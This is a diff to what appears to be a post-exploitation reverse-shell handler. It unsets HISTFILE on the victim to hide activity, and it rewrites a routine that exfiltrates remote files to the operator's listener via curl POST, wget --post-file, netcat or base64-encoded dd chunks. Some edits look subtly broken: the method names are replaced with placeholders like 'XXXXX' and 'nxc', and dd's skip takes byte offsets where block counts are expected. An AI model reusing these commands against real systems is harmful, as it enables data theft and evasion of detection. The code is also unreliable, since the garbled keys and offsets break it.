@@ -63,7 +63,7 @@ class PtyHandler:
 
         # Ensure history is disabled
         util.info("disabling remote command history", overlay=True)
-        client.sendall(b"unset HIST_FILE\n")
+        client.sendall(b"unset HISTFILE\n")
 
         util.info("setting terminal prompt", overlay=True)
         client.sendall(b'export PS1="(remote) \\u@\\h\\$ "\n\n')
@@ -187,17 +187,17 @@ class PtyHandler:
     def do_download(self, argv):
 
         uploaders = {
-            "curl": (
+            "XXXXX": (
                 "http",
                 "curl -X POST --data @{remote_file} http://{lhost}:{lport}/{lfile}",
             ),
-            "wget": (
+            "XXXX": (
                 "http",
                 "wget --post-file {remote_file} http://{lhost}:{lport}/{lfile}",
             ),
-            "nc": ("raw", "nc {lhost} {lport} < {outfile}"),
+            "nxc": ("raw", "nc {lhost} {lport} < {remote_file}"),
         }
-        # servers = {"http": util.receive_http_file, "raw": util.receive_raw_file}
+        servers = {"http": util.receive_http_file, "raw": util.receive_raw_file}
 
         parser = argparse.ArgumentParser(prog="upload")
         parser.add_argument(
@@ -205,7 +205,7 @@ class PtyHandler:
             "-m",
             choices=uploaders.keys(),
             default=None,
-            help="set the download method (default: auto)",
+            help="set the upload method (default: auto)",
         )
         parser.add_argument(
             "--output",
@@ -213,7 +213,7 @@ class PtyHandler:
             default="./{basename}",
             help="path to the output file (default: basename of input)",
         )
-        parser.add_argument("path", help="path to the file to upload")
+        parser.add_argument("path", help="path to the file to download")
 
         try:
             args = parser.parse_args(argv)
@@ -233,7 +233,7 @@ class PtyHandler:
             method = None
             for m, info in uploaders.items():
                 if m in self.known_binaries:
-                    util.info("uploading via {m}")
+                    util.info(f"downloading via {m}")
                     method = info
                     break
             else:
@@ -247,9 +247,11 @@ class PtyHandler:
         outfile = args.output.format(basename=basename)
 
         # Get the remote file size
-        size = self.run(f'wc -c {shlex.quote(path)} 2>/dev/null || echo "none"')
-        if "none" in size:
+        size = self.run(f'stat -c "%s" {shlex.quote(path)} 2>/dev/null || echo "none"')
+        if b"none" in size:
             util.error(f"{path}: no such file or directory")
+            return
+        size = int(size)
 
         with ProgressBar("downloading") as pb:
 
@@ -266,21 +268,26 @@ class PtyHandler:
                     pb.invalidate()
 
             if method is not None:
-                server = servers[method[0]](path, name, progress=on_progress)
+                server = servers[method[0]](outfile, name, progress=on_progress)
 
                 command = method[1].format(
-                    outfile=shlex.quote(outfile), lhost=self.vars["lhost"], lfile=name,
+                    remote_file=shlex.quote(path),
+                    lhost=self.vars["lhost"],
+                    lfile=name,
+                    lport=server.server_address[1],
                 )
-
+                print(command)
                 result = self.run(command, wait=False)
             else:
                 server = None
-                with open(path, "rb") as fp:
-                    self.run(f"echo -n > {outfile}")
+                with open(outfile, "wb") as fp:
                     copied = 0
-                    for chunk in iter(lambda: fp.read(8192), b""):
-                        encoded = base64.b64encode(chunk).decode("utf-8")
-                        self.run(f"echo -n {encoded} | base64 -d >> {outfile}")
+                    for chunk_nr in range(0, size, 8192):
+                        encoded = self.run(
+                            f"dd if={shlex.quote(path)} bs=8192 count=1 skip={chunk_nr} 2>/dev/null | base64"
+                        )
+                        chunk = base64.b64decode(encoded)
+                        fp.write(chunk)
                         copied += len(chunk)
                         on_progress(copied, len(chunk))
 
